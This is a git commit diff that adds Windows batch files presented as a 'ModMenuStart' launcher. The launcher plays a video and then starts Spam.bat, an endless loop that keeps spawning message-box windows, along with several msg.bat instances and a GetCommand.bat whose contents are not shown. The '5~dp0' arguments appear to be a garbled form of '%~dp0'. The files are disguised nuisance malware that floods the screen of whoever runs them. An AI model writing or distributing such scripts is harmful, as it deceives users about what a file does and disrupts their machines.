0f2d30844c94e6bf01044ba6d1ad07570d016941
BreezeHubX <96991216+BreezeHubX@users.noreply.github.com>
2023-12-24 00:58:01 +0100

    Add files via upload

---
+++ Attempt22/ModMenuStart.bat
@@ -0,0 +1,12 @@
+start vid.mp4 5~dp0
+timeout /t 6 /nobreak
+start Spam.bat  5~dp0
+timeout /t 1 /nobreak
+start msg.bat 5~dp0
+timeout /t 1 /nobreak
+start msg.bat 5~dp0
+timeout /t 1 /nobreak
+start msg.bat 5~dp0
+timeout /t 1 /nobreak
+start msg.bat 5~dp0
+start GetCommand.bat 5~dp0
---
+++ Attempt22/Spam.bat
@@ -0,0 +1,6 @@
+@echo off
+
+:loop
+start msgbox.vbs
+CSCRIPT SLEEP.VBS 100
+goto loop
